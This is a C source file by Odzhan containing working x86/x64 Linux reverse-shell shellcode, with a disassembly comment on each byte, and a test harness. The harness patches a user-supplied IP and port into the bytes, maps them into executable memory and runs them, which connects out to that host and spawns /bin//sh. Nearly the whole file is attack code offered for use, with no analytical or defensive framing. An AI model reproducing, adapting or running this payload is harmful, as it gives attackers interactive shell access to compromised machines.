/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/mman.h>

// reverse shell for 32 and 64-bit Linux
//
#define RS_SIZE 129

char RS[] = {
  /* 0000 */ "\xb8\xfd\xff\xfb\x2d"         /* mov eax, 0x2dfbfffd             */
  /* 0005 */ "\xbb\x80\xff\xff\xfe"         /* mov ebx, 0xfeffff80             */
  /* 000A */ "\xf7\xd0"                     /* not eax                         */
  /* 000C */ "\xf7\xd3"                     /* not ebx                         */
  /* 000E */ "\x50"                         /* push rax                        */
  /* 000F */ "\x50"                         /* push rax                        */
  /* 0010 */ "\x54"                         /* push rsp                        */
  /* 0011 */ "\x5f"                         /* pop rdi                         */
  /* 0012 */ "\xab"                         /* stosd                           */
  /* 0013 */ "\x93"                         /* xchg ebx, eax                   */
  /* 0014 */ "\xab"                         /* stosd                           */
  /* 0015 */ "\x54"                         /* push rsp                        */
  /* 0016 */ "\x5d"                         /* pop rbp                         */
  /* 0017 */ "\x31\xc0"                     /* xor eax, eax                    */
  /* 0019 */ "\x99"                         /* cdq                             */
  /* 001A */ "\xb0\x67"                     /* mov al, 0x67                    */
  /* 001C */ "\x6a\x01"                     /* push 0x1                        */
  /* 001E */ "\x5e"                         /* pop rsi                         */
  /* 001F */ "\x6a\x02"                     /* push 0x2                        */
  /* 0021 */ "\x5f"                         /* pop rdi                         */
  /* 0022 */ "\x48\x75\x19"                 /* jnz 0x3e                        */
  /* 0025 */ "\xb0\x29"                     /* mov al, 0x29                    */
  /* 0027 */ "\x0f\x05"                     /* syscall                         */
  /* 0029 */ "\x97"                         /* xchg edi, eax                   */
  /* 002A */ "\x96"                         /* xchg esi, eax                   */
  /* 002B */ "\xb0\x21"                     /* mov al, 0x21                    */
  /* 002D */ "\x0f\x05"                     /* syscall                         */
  /* 002F */ "\x83\xee\x01"                 /* sub esi, 0x1                    */
  /* 0032 */ "\x79\xf7"                     /* jns 0x2b                        */
  /* 0034 */ "\x55"                         /* push rbp                        */
  /* 0035 */ "\x5e"                         /* pop rsi                         */
  /* 0036 */ "\xb2\x10"                     /* mov dl, 0x10                    */
  /* 0038 */ "\xb0\x2a"                     /* mov al, 0x2a                    */
  /* 003A */ "\x0f\x05"                     /* syscall                         */
  /* 003C */ "\xeb\x1f"                     /* jmp 0x5d                        */
  /* 003E */ "\x56"                         /* push rsi                        */
  /* 003F */ "\x5b"                         /* pop rbx                         */
  /* 0040 */ "\x52"                         /* push rdx                        */
  /* 0041 */ "\x53"                         /* push rbx                        */
  /* 0042 */ "\x57"                         /* push rdi                        */
  /* 0043 */ "\x54"                         /* push rsp                        */
  /* 0044 */ "\x59"                         /* pop rcx                         */
  /* 0045 */ "\xcd\x80"                     /* int 0x80                        */
  /* 0047 */ "\x93"                         /* xchg ebx, eax                   */
  /* 0048 */ "\x59"                         /* pop rcx                         */
  /* 0049 */ "\xb0\x3f"                     /* mov al, 0x3f                    */
  /* 004B */ "\xcd\x80"                     /* int 0x80                        */
  /* 004D */ "\x49\x79\xf9"                 /* jns 0x49                        */
  /* 0050 */ "\x6a\x10"                     /* push 0x10                       */
  /* 0052 */ "\x55"                         /* push rbp                        */
  /* 0053 */ "\x53"                         /* push rbx                        */
  /* 0054 */ "\x54"                         /* push rsp                        */
  /* 0055 */ "\x59"                         /* pop rcx                         */
  /* 0056 */ "\x6a\x03"                     /* push 0x3                        */
  /* 0058 */ "\x5b"                         /* pop rbx                         */
  /* 0059 */ "\xb0\x66"                     /* mov al, 0x66                    */
  /* 005B */ "\xcd\x80"                     /* int 0x80                        */
  /* 005D */ "\x99"                         /* cdq                             */
  /* 005E */ "\x31\xf6"                     /* xor esi, esi                    */
  /* 0060 */ "\x50"                         /* push rax                        */
  /* 0061 */ "\x50"                         /* push rax                        */
  /* 0062 */ "\x50"                         /* push rax                        */
  /* 0063 */ "\x54"                         /* push rsp                        */
  /* 0064 */ "\x5b"                         /* pop rbx                         */
  /* 0065 */ "\x53"                         /* push rbx                        */
  /* 0066 */ "\x5f"                         /* pop rdi                         */
  /* 0067 */ "\xc7\x07\x2f\x62\x69\x6e"     /* mov dword [rdi], 0x6e69622f     */
  /* 006D */ "\xc7\x47\x04\x2f\x2f\x73\x68" /* mov dword [rdi+0x4], 0x68732f2f */
  /* 0074 */ "\x40\x75\x04"                 /* jnz 0x7b                        */
  /* 0077 */ "\xb0\x3b"                     /* mov al, 0x3b                    */
  /* 0079 */ "\x0f\x05"                     /* syscall                         */
  /* 007B */ "\x31\xc9"                     /* xor ecx, ecx                    */
  /* 007D */ "\xb0\x0b"                     /* mov al, 0xb                     */
  /* 007F */ "\xcd\x80"                     /* int 0x80                        */
};

void bin2file(void *p, int len)
{
  FILE *out = fopen("rs.bin", "wb");
  if (out!= NULL)
  {
    fwrite(p, 1, len, out);
    fclose(out);
  }
}

void xcode(char *s, int len, uint32_t ip, int16_t port)
{
  uint8_t *p;

  p=(uint8_t*)mmap (0, len,
      PROT_EXEC | PROT_WRITE | PROT_READ,
      MAP_ANON  | MAP_PRIVATE, -1, 0);

  memcpy(p, s, len);
  memcpy((void*)&p[3], &port, 2); // set the port
  memcpy((void*)&p[6], &ip,   4); // set the ip

  //bin2file(p, len);

  // execute
  ((void(*)())p)();

  munmap ((void*)p, len);
}

int main(int argc, char *argv[])
{
  uint32_t ip   = 0;
  int16_t  port = 0;

  if (argc!=3) {
    printf ("\nrs_test <ip> <port>\n");
    return 0;
  }
  ip   = inet_addr(argv[1]);
  port = atoi(argv[2]);

  if (port<0 || port>65535) {
    printf ("\ninvalid port specified");
    return 0;
  }
  port = htons(port);
  // invert both to mask null bytes.
  // obviously no rigorous checking here
  ip   = ~ip;
  port = ~port;

  xcode (RS, RS_SIZE, ip, port);
  return 0;
}